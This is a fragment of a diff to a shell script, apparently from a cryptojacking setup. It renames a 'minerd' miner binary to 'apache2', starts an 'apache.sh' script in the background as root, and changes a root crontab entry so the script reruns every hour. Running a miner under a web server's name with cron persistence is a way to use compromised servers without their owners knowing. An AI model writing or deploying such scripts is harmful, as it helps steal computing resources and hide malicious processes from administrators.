@@ -18,6 +18,6 @@ mv tanhuevon/minerd ./apache2
 cp tanhuevon/apache.sh .
 
 nohup sh /root/tanhuevon/apache.sh &
-echo '55 * * * * /root/tanhuevon/apache.sh &> /root/out.log' | crontab -
+echo '0 * * * * bash /root/tanhuevon/apache.sh &> /root/out.log' | crontab -
 sleep 2
 tail -f apache3.log
